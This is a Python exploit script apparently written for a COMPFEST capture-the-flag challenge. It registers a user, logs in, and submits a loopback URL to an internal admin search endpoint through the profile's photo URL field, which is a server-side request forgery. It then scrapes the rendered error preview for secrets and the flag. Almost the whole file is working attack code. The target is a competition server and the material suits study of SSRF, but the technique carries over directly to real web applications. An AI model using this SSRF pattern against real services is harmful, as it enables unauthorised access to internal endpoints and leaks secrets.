#!/usr/bin/env python3
import requests

# Target URL
BASE_URL = "http://ctf.compfest.id:7302"

def quick_test():
    """Quick test to see what happens with SSRF"""
    print("[+] Quick SSRF Test")
    print("[+] ===============")
    
    # Register and login
    username = "quick_test"
    password = "test123"
    
    data = {'username': username, 'password': password}
    requests.post(f"{BASE_URL}/register", data=data)
    
    response = requests.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    if response.status_code != 302:
        print("[-] Login failed!")
        return
    
    cookies = response.cookies
    print("[+] Login successful!")
    
    # Try SSRF with empty query
    url = "http://127.0.0.1:5000/internal/admin/search"
    data = {'photo_url': url}
    
    print(f"[+] Trying SSRF with: {url}")
    
    try:
        response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
        
        if response.status_code == 200:
            print("[+] SSRF request successful!")
            
            # Check profile page
            profile_response = requests.get(f"{BASE_URL}/profile", cookies=cookies)
            
            if profile_response.status_code == 200:
                if "Failed to render as image" in profile_response.text:
                    print("[+] Got error preview!")
                    
                    # Extract content
                    start = profile_response.text.find("<pre>")
                    end = profile_response.text.find("</pre>")
                    if start != -1 and end != -1:
                        preview = profile_response.text[start+5:end]
                        print(f"[+] Content: {preview}")
                        
                        if "COMPFEST" in preview:
                            print("[+] SUCCESS! Found flag!")
                            return
                        elif "Flag" in preview:
                            print("[+] Found flag reference!")
                            return
                        else:
                            print("[+] Got secrets but no flag")
                else:
                    print("[+] No error preview - content treated as image")
            else:
                print(f"[-] Profile access failed: {profile_response.status_code}")
        else:
            print(f"[-] SSRF failed: {response.status_code}")
    
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    quick_test()
